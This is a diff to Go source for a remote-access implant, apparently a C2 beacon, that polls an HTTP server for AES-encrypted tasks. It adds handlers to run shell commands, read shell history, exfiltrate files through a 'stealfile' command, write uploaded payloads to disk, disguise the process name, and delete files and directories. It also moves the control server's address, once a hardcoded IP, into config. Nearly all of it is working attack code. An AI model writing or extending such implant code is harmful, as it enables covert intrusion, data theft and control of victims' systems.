@@ -13,7 +13,10 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"net/http"
+	"os"
+	"os/user"
 	"regexp"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -56,6 +59,80 @@ var commands = []Commands{
 	{
 		Name: "ls",
 		Execute: func(task BeaconTask) (string, error) {
+			limitSize := true
+			if strings.Contains(task.Args, "-l") {
+				limitSize = false
+			}
+
+			usr, err := user.Current()
+			if err != nil {
+				return "", util.Errorf("error getting current user: %v", err)
+			}
+
+			currentDirectory, err := os.Getwd()
+			if err != nil {
+				return "", util.Errorf("error getting current directory: %v", err)
+			}
+
+			files, err := ioutil.ReadDir(currentDirectory)
+			if err != nil {
+				return "", util.Errorf("error reading directory: %v", err)
+			}
+
+			var fileList strings.Builder
+			for _, file := range files {
+				fileName := file.Name()
+				if file.IsDir() {
+					fileList.WriteString(util.Sprintf("%s - DIR\n", fileName))
+				} else {
+					sizeKB := float64(file.Size()) / 1024.0
+					fileList.WriteString(util.Sprintf("%s - %.2f KB\n", fileName, sizeKB))
+				}
+			}
+
+			result := util.Sprintf("User: %s\nCurrent Directory: %s\nFiles:\n%s", usr.Username, currentDirectory, fileList.String())
+
+			maxSize := 2048
+			if limitSize && len(result) > maxSize {
+				result = result[:maxSize] + "\n[Output truncated to " + strconv.Itoa(maxSize/1024) + "KB]\n"
+			}
+
+			return result, nil
+		},
+	},
+	{
+		Name: "Find",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.Find(task.Args)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "Cat",
+		Execute: func(task BeaconTask) (string, error) {
+			util.Println(task.Args)
+			result, _ := Command.Cat(task.Args)
+			//util.Println(result)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "CD",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.CD(task.Args)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "CP",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.CpCommand(task.Args)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "cd",
+		Execute: func(task BeaconTask) (string, error) {
 			// 这里可以实现具体的命令执行逻辑
 			util.Println("ls had success!")
 			// 模拟执行耗时
@@ -67,8 +144,8 @@ var commands = []Commands{
 	{
 		Name: "ps",
 		Execute: func(task BeaconTask) (string, error) {
-			util.Println("ps had success!")
-			return util.Sprintf("Executed command: %s with args: %s", task.Command, task.Args), nil
+			result, _ := Command.Ps()
+			return util.Sprintf("%s", result), nil
 		},
 	},
 	{
@@ -76,7 +153,200 @@ var commands = []Commands{
 		Execute: func(task BeaconTask) (string, error) {
 			result, _ := Command.ShellExecute(task.Args)
 			util.Println(result)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "history",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.ReadHistory(task.Args)
+
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "ipconfig",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.IPConfig()
+
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "stealfile",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.PSendFileAsync(task.Args)
+
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "Spawn",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.SpawnCommand(task.Args)
+			//util.Println(result)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	// 文件上传
+	//{\"Params\": [{\"OptionName\": \"/home\", \"OptionValue\": \"null\"}]}
+	{
+		Name: "UploadFile",
+		Execute: func(task BeaconTask) (string, error) {
+			var Encfiledata string
+			Encfiledata, _ = AES.Decrypt(task.File)
+			//util.Println("Original Task File:", Encfiledata)
+			// 打印传入的 JSON 字符串
+			//util.Println("Original Task Args:", task.Args)
+			// 清洗 JSON 字符串中的转义字符
+			cleanedArgs, err := strconv.Unquote(`"` + task.Args + `"`)
+			if err != nil {
+				return "", util.Errorf("error cleaning JSON string: %v", err)
+			}
+
+			//util.Println("Cleaned Task Args:", cleanedArgs)
+
+			var argsStruct util.ArgsStruct
+			// 尝试解析 JSON 数据
+			err = json.Unmarshal([]byte(cleanedArgs), &argsStruct)
+			if err != nil {
+				return "", util.Errorf("failed to unmarshal JSON: %v", err)
+			}
+
+			var optionValue string
+			//util.Println("Starting to search for OptionName...")
+
+			for _, param := range argsStruct.Params {
+				if param.OptionName != "" {
+					optionValue = param.OptionName
+					break
+				}
+			}
+
+			//util.Println("Found OptionName:", optionValue)
+
+			if optionValue == "" {
+				return "", util.Errorf("OptionName not found in parameters")
+			}
+			// 解码 Base64 数据
+			fileData, err := base64.StdEncoding.DecodeString(Encfiledata)
+			if err != nil {
+				return "", util.Errorf("failed to decode base64 data: %v", err)
+			}
+
+			// 写入文件
+			err = os.WriteFile(optionValue, fileData, 0644)
+			if err != nil {
+				return "", util.Errorf("failed to write file: %v", err)
+			}
+
+			return util.Sprintf("File successfully written to %s", optionValue), nil
+		},
+	},
+	{
+		Name: "setProcName",
+		Execute: func(task BeaconTask) (string, error) {
+			// 打印传入的 JSON 字符串
+			util.Println("Original Task Args:", task.Args)
+
+			// 清洗 JSON 字符串中的转义字符
+			cleanedArgs, err := strconv.Unquote(`"` + task.Args + `"`)
+			if err != nil {
+				return "", util.Errorf("error cleaning JSON string: %v", err)
+			}
+
+			util.Println("Cleaned Task Args:", cleanedArgs)
+
+			var argsStruct util.ArgsStruct
+			// 尝试解析 JSON 数据
+			err = json.Unmarshal([]byte(cleanedArgs), &argsStruct)
+			if err != nil {
+				return "", util.Errorf("failed to unmarshal JSON: %v", err)
+			}
+
+			var optionValue string
+			util.Println("Starting to search for OptionName...")
+
+			for _, param := range argsStruct.Params {
+				if param.OptionName != "" {
+					optionValue = param.OptionName
+					break
+				}
+			}
+
+			util.Println("Found OptionName:", optionValue)
+
+			if optionValue == "" {
+				return "", util.Errorf("OptionName not found in parameters")
+			}
+
+			result := Command.CrossPlatformSetProcName(optionValue)
+			util.Println(result)
 			return util.Sprintf("Result is %s", result), nil
+		},
+	},
+	{
+		Name: "Sleep",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.ChangeSleep(task.Args)
+			util.Println(result)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "getuid",
+		Execute: func(task BeaconTask) (string, error) {
+			user := sysinfo.GetUser()
+			return util.Sprintf("User is %s", user), nil
+		},
+	},
+	{
+		Name: "ipconfig",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.GetIpConfig()
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "mkdir",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.CreateDirectory(task.Args)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "mkfile",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.CreateFile(task.Args)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "netstat",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.NetStat()
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "pwd",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.Getpwd()
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "rmdir",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.RemoveDirectory(task.Args)
+			return util.Sprintf("%s", result), nil
+		},
+	},
+	{
+		Name: "rmfile",
+		Execute: func(task BeaconTask) (string, error) {
+			result, _ := Command.RemoveFile(task.Args)
+			return util.Sprintf("%s", result), nil
 		},
 	},
 }
@@ -156,11 +426,11 @@ func GetBeaconData() *BeaconData {
 		HostName:  hostname,
 		User:      user,
 		ProcName:  procname,
-		ProcID:    int(procid),
+		ProcID:    procid,
 		Integrity: integrity,
 		Arch:      arch,
 		IPAddr:    ip,
-		OS:        "Windows",
+		OS:        "Linux",
 	}
 }
 
@@ -180,7 +450,7 @@ func (hc *HTTPComms) PollBeacon() error {
 			}()
 
 			// 延时5秒
-			time.Sleep(5 * time.Second)
+			time.Sleep(config.TimeOut)
 		}
 	}
 }
@@ -270,6 +540,8 @@ func (hc *HTTPComms) HandleTaskAsync(task BeaconTask) {
 	task.Command, _ = AES.Decrypt(task.Command)
 	task.Args, _ = AES.Decrypt(task.Args)
 	task.File, _ = AES.Decrypt(task.File)
+	util.Println(task.Command)
+	util.Println(task.Args)
 	// 查找命令
 	var command *Commands
 	for _, cmd := range commands {
@@ -421,7 +693,7 @@ func main() {
 	util.Println("Starting main function")
 	rand.Seed(time.Now().UnixNano())
 
-	hc := NewHTTPComms("121.36.61.196", 5004)
+	hc := NewHTTPComms(config.ServerHost, config.ServerPort)
 	hc.BeaconInit(GetBeaconData())
 
 	// 启动轮询和处理任务的goroutine
